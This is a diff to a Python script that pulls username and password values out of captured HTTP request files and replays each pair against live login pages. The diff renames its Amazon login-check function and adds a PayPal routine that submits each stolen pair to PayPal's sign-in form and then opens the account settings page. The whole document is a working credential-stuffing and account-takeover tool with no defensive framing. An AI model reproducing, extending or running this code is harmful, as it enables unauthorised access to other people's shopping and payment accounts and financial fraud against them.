@@ -1,6 +1,6 @@
 import os, mechanize, re
 
-directory='/HTTPS/'
+directory='./HTTPS/'
 uLabel=['username=', 'user=']
 pLabel=['password=', 'pass=']
 endChar=['&','\n']
@@ -104,7 +104,7 @@ def createCredentialPairList(ul,pl):
         i=i+1
     return credPairList
 
-def credTest(cpl):
+def amazon(cpl):
     i=0
     while(i<len(cpl)):
         br=mechanize.Browser()  
@@ -123,9 +123,29 @@ def credTest(cpl):
         print br.title()
         i=i+1
 
+def paypal(cpl):
+    i=0
+    while(i<len(cpl)):
+        br=mechanize.Browser()  
+        br.set_handle_robots(False)  
+        br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'), ('Accept', '*/*')]
+   
+        sign_in=br.open('https://www.paypal.com/signin/')  
+        print sign_in.geturl()
+        br.select_form('login')  
+        br['login_email']=cpl[i][0] + '@gmail.com'
+        br['login_password']=cpl[i][1]
+        logged_in=br.submit() 
+        br.open('https://www.paypal.com/myaccount/settings/')
+        print br.title()
+        br.open('https://www.paypal.com/myaccount/logout')
+        print logged_in.geturl()
+        i=i+1
 wl=createWorkList()
 ul=createUsernameList(wl)
 pl=createPasswordList(wl)
 cpl=createCredentialPairList(ul,pl)
-credTest(cpl)
+print cpl
+amazon(cpl)
+paypal(cpl)
 
